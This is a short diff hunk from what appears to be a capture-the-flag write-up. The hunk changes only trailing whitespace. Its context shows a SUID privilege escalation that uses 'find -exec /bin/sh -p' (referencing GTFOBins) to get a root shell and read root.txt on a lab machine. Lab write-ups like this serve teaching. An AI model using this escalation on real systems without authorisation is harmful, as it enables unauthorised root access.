@@ -397,7 +397,7 @@ A quick search in <a href="https://gtfobins.github.io/gtfobins/find/#suid">GTFOb
 ```bash
 stoner@Vulnerable:/home$ /usr/bin/find . -exec /bin/sh -p \; -quit
 # whoami
-  root
+  root 
 # cd /root
 # cat root.txt
   It [removed]?
